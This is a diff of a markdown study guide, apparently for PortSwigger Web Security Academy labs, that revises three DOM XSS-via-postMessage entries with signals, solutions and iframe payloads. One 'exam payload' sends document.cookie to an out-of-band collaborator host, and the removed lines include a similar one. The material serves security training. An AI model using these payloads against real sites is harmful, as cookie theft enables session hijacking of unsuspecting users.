@@ -89,26 +89,26 @@ git-cola --repo TARGET.web-security-academy.net/
 
 **1. DOM XSS using web messages**
 
-- Signal: the page has a `window.addEventListener('message', ...)` that passes `e.data` directly to a sink like `eval()`, without checking `e.origin`.
-- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with the payload, with `targetOrigin` `'*'`.
-- Payload: `<iframe src="https://TARGET/vulnerable-page" onload="this.contentWindow.postMessage('print()','*')">`
+- Signal: the page has a `window.addEventListener('message', ...)` meant to handle ads, which inserts `e.data` directly into the DOM (e.g. as the `innerHTML` of a `div`), without checking `e.origin` or encoding the content.
+- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with a tag that abuses an error handler to run code (since a `<script>` injected via `innerHTML` won't execute), with `targetOrigin` `'*'`.
+- Payload: `<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
 - Link: [DOM XSS using web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages)
 - Step: 1
 
 **2. DOM XSS using web messages and a JavaScript URL**
 
-- Signal: as above, but the sink isn't a direct `eval`: the message value is used to set a URL (e.g. the `location` of a link) that accepts the `javascript:` scheme.
-- Solution: instead of direct JS code, send as the message data a `javascript:` string that executes the payload when the URL is activated.
-- Payload: `postMessage('javascript:alert(document.domain)','*')`
-- Exam payload (Burp Collaborator): `postMessage('javascript:document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie','*')`
+- Signal: the event listener has a flawed `indexOf()` check that looks for the string `"http:"` (or `"https:"`) anywhere in the message, before passing the value to the `location.href` sink.
+- Solution: send a `javascript:` payload as the message data that also contains, somewhere in the string (e.g. after a `//` comment), the `"http:"` substring the check requires, so it passes the check and the sink runs the URL.
+- Payload: `this.contentWindow.postMessage('javascript:print()//http:','*')`
+- Exam payload (Burp Collaborator/OAST): `<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=\`https://OASTIFY.COM?c=\`+document.cookie','*')">` — here the check passes on its own, because the payload's URL already starts with `https:`, which contains the `http:` substring the check needs (no need to manually append `//http:`).
 - Link: [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 - Step: 1
 
 **3. DOM XSS using web messages and JSON.parse**
 
-- Signal: the event listener checks the origin but weakly, with `indexOf`, `startsWith` or `endsWith` on the origin string (e.g. it only checks that it contains "normal-website.com"); the data then goes through `JSON.parse` before reaching the sink.
-- Solution: host the exploit on a domain that satisfies the weak check (e.g. `http://normal-website.com.attacker.net` for `indexOf`/`startsWith`, or `http://malicious-normal-website.com` for `endsWith`), and send the payload in the JSON format the app expects.
-- Payload: iframe on the domain that bypasses the check + `postMessage('{"payload":"print()"}', '*')` (adapt the JSON structure to the vulnerable code)
+- Signal: the event listener runs `JSON.parse(e.data)` before using the result: it expects a `type` property, and inside a `switch` the matching case (e.g. `"load-channel"`) assigns the message's `url` property to the `src` of an inner iframe, without checking `e.origin` or validating the URL's scheme.
+- Solution: host an iframe that loads the vulnerable page and, on its `onload`, send a `postMessage` with a JSON string that sets `type` to the value the `switch` expects and `url` to a `javascript:` payload, exploiting the missing origin/scheme check to get the payload set as the inner iframe's `src`.
+- Payload: `this.contentWindow.postMessage('{"type":"load-channel","url":"javascript:print()"}','*')`
 - Link: [DOM XSS using web messages and JSON.parse](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse)
 - Step: 1
 
